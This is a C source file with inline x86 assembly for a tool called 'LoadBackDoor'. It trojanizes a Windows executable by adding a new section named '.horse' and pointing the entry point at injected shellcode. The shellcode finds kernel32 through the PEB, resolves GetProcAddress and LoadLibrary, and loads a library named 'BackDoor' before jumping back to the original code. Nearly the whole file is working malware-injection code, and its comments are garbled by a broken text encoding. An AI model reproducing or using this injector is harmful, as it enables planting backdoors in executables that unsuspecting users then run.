#include <windows.h>
#include <winnt.h>
#include <stdio.h>
#include <assert.h>

#define DEBUG 1
#define EXTRA_CODE_LENGTH 18
#define SECTION_SIZE 0x1000
#define SECTION_NAME ".horse"
#define FILE_NAME_LENGTH 30

int Align(int size, int ALIGN_BASE)
{
	int result;

	assert(0 != ALIGN_BASE);

	result = size % ALIGN_BASE;
	if (result != 0) return ((size/ALIGN_BASE)+1)*ALIGN_BASE;
	else return size;
}


void usage()
{
	printf("Usage:  \n");
	printf("LoadBackDoor.exe FileName\n");
	printf("eg: \n");
	printf("\tLoadBackDoor.exe test.exe");
}

int main(int argc, char* argv[])
{
	IMAGE_DOS_HEADER DosHeader;
	IMAGE_NT_HEADERS NtHeader;
	IMAGE_SECTION_HEADER SectionHeader;
	IMAGE_SECTION_HEADER newSection;
	int numOfSections;
	FILE *pNewFile;
	int FILE_ALIGN_MENT;
	int SECTION_ALIGN_MENT;
	char srcFileName[FILE_NAME_LENGTH];
	char newFileName[FILE_NAME_LENGTH];
	int i;
	int extraLengthAfterAlign;
	unsigned int newEP;
	unsigned int oldEP;
	BYTE jmp;
	char *pExtra_data;
	int extra_data_real_length;

	if (argv[1] == NULL)
	{
		puts("Wrong arguments!\n");
		usage();
		exit(0);
	}
	strcpy(srcFileName, argv[1]);
	strcpy(newFileName, srcFileName);
	strcat(newFileName, ".exe");

	if (!CopyFile(srcFileName, newFileName, FALSE))
	{
		puts("Copy file error!\n");
		exit(0);
	}

	pNewFile = fopen(newFileName, "rb+");
	if (pNewFile == NULL)
	{
		puts("Open file error!\n");
		exit(0);
	}

	fseek(pNewFile, 0, SEEK_SET);
	fread(&DosHeader, sizeof(IMAGE_DOS_HEADER), 1, pNewFile);
	if (DosHeader.e_magic != IMAGE_DOS_SIGNATURE)
	{
		puts("Invalid PE file.\n");
		exit(0);
	}

	fseek(pNewFile, DosHeader.e_lfanew, SEEK_SET);
	fread(&NtHeader, sizeof(IMAGE_NT_HEADERS), 1, pNewFile);
	if (NtHeader.Signature != IMAGE_NT_SIGNATURE)
	{
		puts("Invalid PE file.\n");
		exit(0);
	}

	numOfSections = NtHeader.FileHeader.NumberOfSections;
	FILE_ALIGN_MENT = NtHeader.OptionalHeader.FileAlignment;
	SECTION_ALIGN_MENT = NtHeader.OptionalHeader.SectionAlignment;
#if DEBUG
	printf("FILE_ALIGN_MENT-> %x\n", FILE_ALIGN_MENT);
	printf("SECTION_ALIGN_MENT-> %x\n", SECTION_ALIGN_MENT);
#endif

	oldEP = NtHeader.OptionalHeader.AddressOfEntryPoint;

	for (i = 0; i < numOfSections; i++)
	{
		fread(&SectionHeader, sizeof(IMAGE_SECTION_HEADER), 1, pNewFile);
#if DEBUG
		printf("Section%d: %s\n", i, SectionHeader.Name);
#endif
	}

	extraLengthAfterAlign = Align(EXTRA_CODE_LENGTH, FILE_ALIGN_MENT);
	NtHeader.FileHeader.NumberOfSections++;;
	memset(&newSection, 0, sizeof(newSection));

	strcpy((char*)&newSection.Name, SECTION_NAME);
	newSection.VirtualAddress = Align(SectionHeader.VirtualAddress + SectionHeader.Misc.VirtualSize,
		SECTION_ALIGN_MENT);
	newSection.Misc.VirtualSize = Align(extraLengthAfterAlign, SECTION_ALIGN_MENT);
	newSection.PointerToRawData = Align(SectionHeader.PointerToRawData + SectionHeader.SizeOfRawData,
		FILE_ALIGN_MENT);
	newSection.SizeOfRawData = Align(SECTION_SIZE, FILE_ALIGN_MENT);
	newSection.Characteristics = 0xE0000020;

	NtHeader.OptionalHeader.SizeOfCode = Align(NtHeader.OptionalHeader.SizeOfCode + SECTION_SIZE,
		FILE_ALIGN_MENT);
	NtHeader.OptionalHeader.SizeOfImage = NtHeader.OptionalHeader.SizeOfImage + Align(SECTION_SIZE, SECTION_ALIGN_MENT);
	NtHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
	NtHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
	
	fseek(pNewFile, 0, SEEK_END);
	newEP = newSection.VirtualAddress;
	NtHeader.OptionalHeader.AddressOfEntryPoint = newEP;
	
	fseek(pNewFile, DosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS)
		+ numOfSections * sizeof(IMAGE_SECTION_HEADER), SEEK_SET);
	fwrite(&newSection, sizeof(IMAGE_NT_HEADERS), 1, pNewFile);

	fseek(pNewFile, DosHeader.e_lfanew, SEEK_SET);
	fwrite(&NtHeader, sizeof(IMAGE_NT_HEADERS), 1, pNewFile);

	fseek(pNewFile, 0, SEEK_END);

	for (i=0; i<Align(SECTION_SIZE, FILE_ALIGN_MENT); i++)
	{
		fputc(0, pNewFile);
	}

	fseek(pNewFile, newSection.PointerToRawData, SEEK_SET);
	goto GetExtraData;

extra_data_start:
	_asm pushad
	_asm mov eax, fs:0x30			// PEB
	_asm mov eax, [eax + 0x0c]		// PEB_LDR_DATA
	_asm mov esi, [eax + 0x1c]		// InIntializeationOrderModuleList
	_asm lodsd
	_asm mov eax, [eax + 0x08]		// BaseAddress of kernel32.dll
	_asm mov edi, eax				// basement of kernel32.dll
 
	_asm mov ebp, eax
	_asm mov eax, [ebp + 3ch]       // eax = IMAGE_NT_HEADERS
	_asm mov edx, [ebp + eax + 78h] // edx = IMAGE_DATA_DIRECTORY
	_asm add edx, ebp               // 
	_asm mov ecx, [edx + 18h]       // NumberOfFunctions
	_asm mov ebx, [edx + 20h]		// AddressOfNames
	_asm add ebx, ebp   // IMAGE_DIRECYORY_IMPORT

search:
	_asm	dec ecx
	_asm 	mov esi, [ebx + ecx * 4]
		
	_asm 	add esi, ebp
	_asm 	mov eax, 0x50746547
	_asm 	cmp [esi], eax		//�Ƚ�"PteG"
	_asm 	jne search
	_asm 	mov eax, 0x41636f72
	_asm 	cmp [esi + 4], eax
	_asm 	jne search
	_asm 	mov ebx, [edx + 24h]
	_asm 	add ebx, ebp
	_asm 	mov cx, [ebx + ecx * 2]
	_asm 	mov ebx, [edx + 1ch]
	_asm 	add ebx, ebp
	_asm 	mov eax, [ebx + ecx * 4]
	_asm 	add eax, ebp		//eax����ľ���GetProcAddress�ĵ�ַ
		
		//Ϊ�ֲ���������ռ�
	_asm 	push ebp
	_asm 	sub esp, 50h
	_asm 	mov ebp, esp
		
		//����LoadLibrary�ĵ�ַ
	_asm 	mov [ebp + 40h], eax	//��GetProcAddress�ĵ�ַ���浽ebp + 40��
	
		//��ʼ����LoadLibrary�ĵ�ַ, �ȹ���"LoadLibrary\0"
	_asm 	push 0x0	//��'\0'
	_asm 	push DWORD PTR 0x41797261
	_asm 	push DWORD PTR 0x7262694c
	_asm 	push DWORD PTR 0x64616f4c
	_asm 	push esp	//ѹ��"LoadLibrary\0"�ĵ�ַ
	_asm 	push edi	//edi:kernel32�Ļ�ַ
	_asm 	call [ebp + 40h]	//����ֵ(��LoadLibrary�ĵ�ַ)������eax��
	_asm 	mov [ebp + 44h], eax	//����LoadLibrary�ĵ�ַ��ebp + 44h
	_asm 	push 0x0
	_asm 	push DWORD PTR 0x726f6f44	//"Door"
	_asm 	push DWORD PTR 0x6b636142	//"Back"
	_asm 	push esp					//�ַ���"BackDoor"�ĵ�ַ
	_asm 	call [ebp + 44h]	//����call eax
	_asm	mov esp, ebp
	_asm	add esp, 0x50
	_asm	popad
extra_data_end:


GetExtraData:
	_asm pushad
	_asm lea eax, extra_data_start
	_asm mov pExtra_data, eax
	_asm lea edx, extra_data_end
	_asm sub edx, eax
	_asm mov extra_data_real_length, edx
	_asm popad

	for (i = 0; i<extra_data_real_length; i++)
	{
		fputc(pExtra_data[i], pNewFile);
	}
	
	oldEP = oldEP - (newEP + extra_data_real_length) - 5;
	jmp = 0xE9;
	
	fwrite(&jmp, sizeof(jmp), 1, pNewFile);
	fwrite(&oldEP, sizeof(oldEP), 1, pNewFile);

	fclose(pNewFile); 
	
	return 0;
}
